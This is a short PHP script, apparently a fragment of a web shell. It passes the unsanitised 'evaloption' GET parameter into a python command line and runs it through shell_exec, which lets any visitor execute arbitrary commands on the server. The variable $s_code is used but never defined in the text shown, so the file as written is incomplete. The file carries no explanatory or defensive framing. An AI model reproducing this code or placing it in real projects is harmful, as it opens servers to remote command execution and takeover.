<?php
function exe($s_c){
	$s_out = "";
	$s_c = $s_c." 2>&1";

	if(is_callable('shell_exec')){
		$s_out = @shell_exec($s_c);
	}
	return $s_out;
}

$s_evaloption = $_GET['evaloption'];
$s_lang = 'python';
$s_tmpdir = getcwd();
$s_rand = md5(time().rand(0,100));
$s_script = $s_tmpdir.$s_rand;
if(file_put_contents($s_script, $s_code)!==false){
	$s_res = exe($s_lang." ".$s_evaloption." ".$s_script);
	unlink($s_script);
}

?>